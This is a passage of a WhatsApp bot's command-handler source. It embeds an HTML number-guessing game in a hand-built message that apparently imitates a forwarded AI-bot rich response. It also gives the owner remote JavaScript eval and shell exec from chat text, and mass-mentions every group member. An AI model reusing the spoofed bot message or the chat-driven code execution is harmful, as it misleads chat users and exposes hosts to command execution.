 border: 2px solid #2a3a5a;
 border-radius: 8px;
 font-size: 0.6rem;
 font-weight: bold;
 padding: 0.35rem 0.1rem;
 cursor: pointer;
 transition: 0.1s;
 font-family: inherit;
 letter-spacing: 0.5px;
 text-align: center;
 }

.level-btn:active {
 transform: scale(0.95);
 }

.level-btn.active {
 background: #2a4a7a;
 color: #c8dfff;
 border-color: #6a9aff;
 box-shadow: 0 0 10px rgba(80, 150, 255, 0.5);
 text-shadow: 0 0 6px #6a9aff;
 }

.level-btn[data-level="easy"].active {
 background: #1a4a2a;
 border-color: #4aff6a;
 color: #b0ffb0;
 box-shadow: 0 0 10px rgba(74, 255, 106, 0.5);
 }

.level-btn[data-level="hard"].active {
 background: #4a2a1a;
 border-color: #ff8a4a;
 color: #ffd0b0;
 box-shadow: 0 0 10px rgba(255, 138, 74, 0.5);
 }

.level-btn[data-level="master"].active {
 background: #4a1a2a;
 border-color: #ff4a7a;
 color: #ffb0c8;
 box-shadow: 0 0 10px rgba(255, 74, 122, 0.5);
 }

.display-area {
 background: #0a0e1a;
 border-radius: 16px;
 padding: 0.7rem 0.6rem;
 box-shadow: inset 0 0 0 2px #2a3a5a, 0 5px 8px rgba(0, 0, 0, 0.5);
 margin-bottom: 0.6rem;
 }

.number-grid {
 display: grid;
 grid-template-columns: repeat(4, 1fr);
 gap: 6px;
 width: 100%;
 margin: 0 auto;
 touch-action: manipulation;
 }

.num-btn {
 background: #1a2a4a;
 border: 2px solid #3a5a7a;
 border-radius: 10px;
 color: #c8dfff;
 font-size: 1.2rem;
 font-weight: bold;
 text-align: center;
 box-shadow: inset 0 -4px 0 #0f1a2f, 0 2px 0 #0a1220;
 cursor: pointer;
 transition: 0.04s linear;
 touch-action: manipulation;
 font-family: inherit;
 aspect-ratio: 1 / 1;
 display: flex;
 align-items: center;
 justify-content: center;
 }

.num-btn:active {
 transform: translateY(2px);
 box-shadow: inset 0 -2px 0 #0f1a2f, 0 0 0 #0a1220;
 }

.num-btn.selected {
 background: #2a4a7a;
 border-color: #6a9aff;
 box-shadow: inset 0 -4px 0 #1a2a5a, 0 2px 0 #0a1220, 0 0 12px rgba(80, 150, 255, 0.3);
 }

.num-btn.boom {
 background: #7a2a2a;
 border-color: #ff5a5a;
 color: #ffb0b0;
 box-shadow: inset 0 -4px 0 #4a1a1a, 0 2px 0 #0a1220, 0 0 18px rgba(255, 50, 50, 0.4);
 }

.num-btn.hidden {
 background: #0a0e1a;
 border-color: #1a2a3a;
 color: transparent;
 box-shadow: inset 0 -4px 0 #05080f, 0 2px 0 #0a1220;
 }

.num-btn.revealed {
 background: #1a3a2a;
 border-color: #4a8a5a;
 color: #b0ffb0;
 box-shadow: inset 0 -4px 0 #0f2a1a, 0 2px 0 #0a1220, 0 0 12px rgba(50, 255, 80, 0.25);
 }

.num-btn.ai {
 background: #4a2a7a;
 border-color: #a07aff;
 color: #e0c8ff;
 box-shadow: inset 0 -4px 0 #2a1a4a, 0 2px 0 #0a1220, 0 0 12px rgba(160, 100, 255, 0.4);
 }

.num-btn.disabled {
 opacity: 0.5;
 transform: scale(0.95);
 pointer-events: none;
 }

.status-panel {
 display: flex;
 justify-content: space-between;
 align-items: center;
 gap: 6px;
 padding: 0 2px;
 }

.score-box {
 background: #0a0e1a;
 color: #b0c8ff;
 font-size: 0.75rem;
 font-weight: bold;
 padding: 0.2rem 0.7rem;
 border-radius: 40px;
 border: 2px solid #3a5a7a;
 box-shadow: inset 0 -2px 0 #1a2a4a;
 text-shadow: 0 0 6px #6f8fcf;
 text-align: center;
 white-space: nowrap;
 }

.ctrl-btn {
 background: #1a2a4a;
 color: #c8dfff;
 border: 2px solid #3a5a7a;
 font-size: 0.75rem;
 font-weight: bold;
 padding: 0.25rem 0.8rem;
 border-radius: 60px;
 box-shadow: inset 0 -4px 0 #0f1a2f, 0 2px 0 #0a1220;
 cursor: pointer;
 transition: 0.06s linear;
 font-family: inherit;
 white-space: nowrap;
 }

.ctrl-btn:active {
 transform: translateY(2px);
 box-shadow: inset 0 -2px 0 #0f1a2f;
 }

.msg-box {
 text-align: center;
 font-size: 0.75rem;
 color: #b0c8ff;
 min-height: 1.1rem;
 padding: 0.35rem 0.2rem 0;
 text-shadow: 0 0 8px #4f6faf;
 font-weight: bold;
 line-height: 1.3;
 }

.msg-box.you { color: #b0ffb0; text-shadow: 0 0 8px #4aff6a; }
.msg-box.ai { color: #e0c8ff; text-shadow: 0 0 8px #a07aff; }
.msg-box.boom { color: #ffb0b0; text-shadow: 0 0 8px #ff5a5a; }

.hint {
 color: #6a7a9a;
 text-align: center;
 margin-top: 6px;
 font-size: 0.55rem;
 letter-spacing: 1px;
 opacity: 0.7;
 }
</style>
</head>
<body>

<div class="game-wrapper">
 <div class="level-bar">
 <button class="level-btn active" data-level="easy">EASY</button>
 <button class="level-btn" data-level="medium">MEDIUM</button>
 <button class="level-btn" data-level="hard">HARD</button>
 <button class="level-btn" data-level="master">MASTER</button>
 </div>

 <div class="display-area">
 <div class="number-grid" id="numberGrid"></div>
 <div class="msg-box" id="messageBox">✨ choose level, then start!</div>
 </div>

 <div class="status-panel">
 <div class="score-box" id="scoreDisplay">🧑 0 - 0 🤖</div>
 <button class="ctrl-btn" id="resetBtn">↻ Restart</button>
 </div>

 <div class="hint" id="hintText">👆 you vs client · 1 BOOM hidden</div>
</div>

<script>
(function () {
 const TOTAL = 12;

 let boomIndex = -1;
 let revealed = [];
 let owner = [];
 let gameOver = false;
 let yourTurn = true;
 let busy = false;
 let scoreYou = 0;
 let scoreAI = 0;
 let level = 'easy';
 let audioCtx = null;

 const gridEl = document.getElementById('numberGrid');
 const scoreSpan = document.getElementById('scoreDisplay');
 const msgBox = document.getElementById('messageBox');
 const resetBtn = document.getElementById('resetBtn');
 const hintText = document.getElementById('hintText');
 const levelBtns = document.querySelectorAll('.level-btn');

 const LEVEL_INFO = {
 easy: { name: 'EASY', desc: '👶 client polos · choose random', aiSkill: 0.0 },
 medium: { name: 'MEDIUM', desc: '🧠 client · 30% avoid', aiSkill: 0.3 },
 hard: { name: 'HARD', desc: '🔥 client pintar · 60% avoid', aiSkill: 0.6 },
 master: { name: 'MASTER', desc: '👑 client jenius · 90% avoid', aiSkill: 0.9 }
 };

 function initAudio() {
 if (!audioCtx) {
 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 }
 }

 function playTone(freq, dur, vol) {
 try {
 initAudio();
 const o = audioCtx.createOscillator();
 const g = audioCtx.createGain();
 o.type = 'sine';
 o.frequency.value = freq;
 g.gain.value = vol;
 g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur / 1000);
 o.connect(g);
 g.connect(audioCtx.destination);
 o.start();
 o.stop(audioCtx.currentTime + dur / 1000);
 } catch (e) {}
 }

 function playSafeYou() { playTone(620, 80, 0.10); }
 function playSafeAI() { playTone(420, 80, 0.08); }
 function playBoom() {
 playTone(180, 350, 0.20);
 setTimeout(function(){ playTone(130, 300, 0.15); }, 120);
 }
 function playWin() {
 playTone(780, 100, 0.12);
 setTimeout(function(){ playTone(980, 100, 0.12); }, 110);
 setTimeout(function(){ playTone(1180, 140, 0.12); }, 220);
 }
 function playClick() { playTone(500, 50, 0.06); }

 function setMsg(text, cls) {
 msgBox.textContent = text;
 msgBox.className = 'msg-box' + (cls? ' ' + cls: '');
 }

 function updateScore() {
 scoreSpan.textContent = '🧑 ' + scoreYou + ' - ' + scoreAI + ' 🤖';
 }

 function emptyCells() {
 const arr = [];
 for (let i = 0; i < TOTAL; i++) {
 if (!revealed[i]) arr.push(i);
 }
 return arr;
 }

 function startGame() {
 boomIndex = Math.floor(Math.random() * TOTAL);
 revealed = new Array(TOTAL).fill(false);
 owner = new Array(TOTAL).fill(null);
 gameOver = false;
 busy = false;
 yourTurn = true;
 updateScore();
 setMsg('🎮 Giliran you — choose angka!', 'you');
 hintText.textContent = '👆 you vs client · 1 BOOM hidden';
 renderGrid();
 }

 function renderGrid() {
 gridEl.innerHTML = '';

 for (let i = 0; i < TOTAL; i++) {
 (function (idx) {
 const btn = document.createElement('div');
 btn.className = 'num-btn';

 if (revealed[idx]) {
 if (idx === boomIndex) {
 btn.classList.add('boom');
 btn.textContent = '💥';
 } else if (owner[idx] === 'ai') {
 btn.classList.add('ai');
 btn.textContent = '🤖';
 } else {
 btn.classList.add('revealed');
 btn.textContent = '✅';
 }
 btn.classList.add('disabled');
 } else {
 if (gameOver) {
 btn.classList.add('disabled');
 if (idx === boomIndex) {
 btn.classList.add('boom');
 btn.textContent = '💥';
 } else {
 btn.classList.add('hidden');
 btn.textContent = '?';
 }
 } else {
 btn.textContent = '?';
 btn.classList.add('selected');
 }
 }

 btn.addEventListener('click', function (e) { handleClick(e, idx); });
 btn.addEventListener('touchstart', function (e) {
 e.preventDefault();
 handleClick(e, idx);
 }, { passive: false });

 gridEl.appendChild(btn);
 })(i);
 }
 }

 function handleClick(e, idx) {
 e.stopPropagation();
 e.preventDefault();
 if (gameOver || busy ||!yourTurn || revealed[idx]) return;

 initAudio();
 yourTurn = false;
 busy = true;

 if (idx === boomIndex) {
 revealed[idx] = true;
 owner[idx] = 'you';
 gameOver = true;
 busy = false;
 playBoom();
 scoreAI++;
 updateScore();
 setMsg('💥 You got BOOMED! Client wins!', 'boom');
 renderGrid();
 return;
 }

 revealed[idx] = true;
 owner[idx] = 'you';
 playSafeYou();
 setMsg('✅ Aman! Giliran client...', 'you');
 renderGrid();

 const delay = level === 'master'? 500: level === 'hard'? 700: 900;
 setTimeout(aiMove, delay + Math.random() * 400);
 }

 function aiMove() {
 if (gameOver) { busy = false; return; }

 const empty = emptyCells();
 if (empty.length === 0) { busy = false; return; }

 const skill = LEVEL_INFO[level].aiSkill;
 let pick;

 if (Math.random() < skill && empty.length > 1) {
 const safeSkip = [];
 const shuffled = empty.slice().sort(function () { return Math.random() - 0.5; });
 const skipCount = Math.min(Math.floor(skill * 3), empty.length - 1);
 for (let i = 0; i < skipCount; i++) safeSkip.push(shuffled[i]);
 const candidates = empty.filter(function (i) { return safeSkip.indexOf(i) === -1; });
 pick = candidates[Math.floor(Math.random() * candidates.length)];
 } else {
 pick = empty[Math.floor(Math.random() * empty.length)];
 }

 if (pick === boomIndex) {
 revealed[pick] = true;
 owner[pick] = 'ai';
 gameOver = true;
 busy = false;
 playBoom();
 scoreYou++;
 updateScore();
 setMsg('💥 client kena BOOM! you WIN!', 'boom');
 playWin();
 renderGrid();
 return;
 }

 revealed[pick] = true;
 owner[pick] = 'ai';
 playSafeAI();
 yourTurn = true;
 busy = false;
 setMsg('🎮 Giliran you — choose angka!', 'you');
 renderGrid();
 }

 levelBtns.forEach(function (btn) {
 btn.addEventListener('click', function () {
 level = btn.dataset.level;
 levelBtns.forEach(function (b) { b.classList.remove('active'); });
 btn.classList.add('active');
 playClick();
 scoreYou = 0;
 scoreAI = 0;
 hintText.textContent = LEVEL_INFO[level].desc;
 startGame();
 });
 });

 resetBtn.addEventListener('click', function () { startGame(); });

 startGame();
})();
</script>

</body>
</html>
 `;
          const data = {
            response_id: "PopiooNixelPopiooNixelPopiooNixel",
            sections: [{
              __typename: "GenAIUnifiedResponseSection",
              view_model: {
                __typename: "GenAISingleLayoutViewModel",
                primitive: {
                  __typename: "GenAIBotProgressStatusPrimitive",
                  title: "click this text",
                  is_in_progress: true
                }
              }
            }],
            embedded_screens: [{
              title: "Preview",
              content: [{
                __typename: "FOAIDNixelButtonSheets",
                tabs: [{
                  id: "tab_0",
                  tab_header: "Akoya-MD",
                  sections: [{
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: "https://example.com",
                        trusted_sources: ["example.com"]
                      }
                    }
                  }],
                  step_entries: []
                }]
              }]
            }]
          };
          await client.relayMessage(m.chat, {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                messageDisclaimerText: "",
                richResponseSourcesMetadata: {}
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify(data)).toString('base64')
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "0@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }, {
            messageId: await client.generateMessageTag()
          });
        }
        break;

      /// ───────────── [ 𝖣𝖾𝖿𝖺𝗎𝗅𝗍 & 𝖤𝗏𝖺𝗅 ] ──────────── ///
      default:
        {
          if (budy.startsWith('=>')) {
            if (!isOwner) return reply(mess.owner);
            try {
              let evaled = await eval(budy.slice(2));
              if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
              await xreply(evaled);
            } catch (err) {
              await xreply(String(err));
            }
          }
          if (m.text.toLowerCase() == "bot") {
            let groupMetadata = await client.groupMetadata(m.chat).catch(e => null);
            let member = groupMetadata.participants.map(u => u.id);
            client.relayMessage(m.chat, {
              extendedTextMessage: {
                text: "*𝖡𝗈𝗍 𝖮𝗇𝗅𝗂𝗇𝖾 😘*",
                contextInfo: {
                  mentionedJid: member,
                  isForwarded: true,
                  ...(global.newsletterInfo ? { forwardedNewsletterMessageInfo: { ...global.newsletterInfo, serverMessageId: 143 } } : {}),
                  businessMessageForwardInfo: {
                    businessOwnerJid: client.decodeJid(client.user.id)
                  },
                  externalAdReply: {
                    automatedGreetingMessageShown: true,
                    greetingMessageBody: "𝖡𝗈𝗍𝗌 𝖮𝗇𝗅𝗂𝗇𝖾",
                    thumbnail: thumb,
                    title: `${m.pushName}`,
                    body: `${m.pushName}`,
                    mediaType: 1,
                    containsAutoReply: true
                  }
                }
              }
            }, {});
          }
          if (budy.startsWith('>')) {
            if (!isOwner) return reply(mess.owner);
            try {
              let evaled = await eval(`(async () => { ${budy.slice(2)} })()`);
              if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
              await xreply(evaled);
            } catch (err) {
              await xreply(String(err));
            }
          }
          if (budy.startsWith('$')) {
            if (!isOwner) return reply(mess.owner);
            if (!text) return;
            exec(budy.slice(2), (err, stdout) => {
              if (err) return xreply(`${err}`);
              if (stdout) return xreply(stdout);
            });
          }
          // An unrecognised command used to vanish without a word, which is
          // indistinguishable from the bot being offline. Say so instead.
          if (isCmd) {
            await reply(`\`${prefix + command}\` is not a command I have. Try \`${prefix}menu\`.`);
          }
        }
    }
  } catch (err) {
    console.log(util.format(err));
    let Obj = global.owner;
    client.sendMessage(Obj + "@s.whatsapp.net", {
      text: `*Developer notice, an error occurred in command:* ${isCmd ? prefix + command : m.text}

*Error details:*
${util.format(err)}`,
      contextInfo: {
        isForwarded: true
      }
    }, {
      quoted: m
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});